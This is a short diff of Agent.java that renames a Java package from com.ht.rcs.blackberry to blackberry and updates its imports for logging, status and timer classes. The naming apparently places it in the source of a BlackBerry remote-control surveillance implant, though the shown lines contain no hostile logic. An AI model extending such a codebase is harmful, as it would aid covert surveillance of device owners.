@@ -5,14 +5,14 @@
  * File         : Agent.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.agent;
+package blackberry.agent;
 
-import com.ht.rcs.blackberry.Status;
-import com.ht.rcs.blackberry.log.Log;
-import com.ht.rcs.blackberry.log.LogCollector;
-import com.ht.rcs.blackberry.threadpool.TimerJob;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.Status;
+import blackberry.log.Log;
+import blackberry.log.LogCollector;
+import blackberry.threadpool.TimerJob;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 public abstract class Agent extends TimerJob {
     //#debug
